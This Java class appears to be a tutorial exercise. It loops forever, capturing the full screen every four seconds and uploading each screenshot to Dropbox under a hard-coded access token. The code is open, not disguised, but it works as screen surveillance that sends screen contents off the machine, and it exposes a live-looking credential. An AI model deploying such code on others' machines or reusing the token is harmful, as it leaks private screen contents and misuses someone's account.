import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

public class MyThread extends Thread {
    private DbxRequestConfig config;
    private DbxClientV2 client;

    public MyThread(){
        // Инициализация переменных config и client для Dropbox
        config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, "D0Jys_f4OaAAAAAAAAAAIxEtNWcYJwYaNLywWx3aC-bNMoZGvFkk8SggpAv1HmWK");
    }

    public void run() {
        try {
            Robot robot = new Robot();
            Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image;
            DateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");

            for ( ; ; ) {
                image = robot.createScreenCapture(rect);
                System.out.println("Done.");
                ByteArrayOutputStream outS = new ByteArrayOutputStream();
                ImageIO.write(image, "png", outS);
                InputStream inS = new ByteArrayInputStream(outS.toByteArray());
                client.files().uploadBuilder("/" + format.format(new Date()) + ".png").uploadAndFinish(inS);
                sleep(4000);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
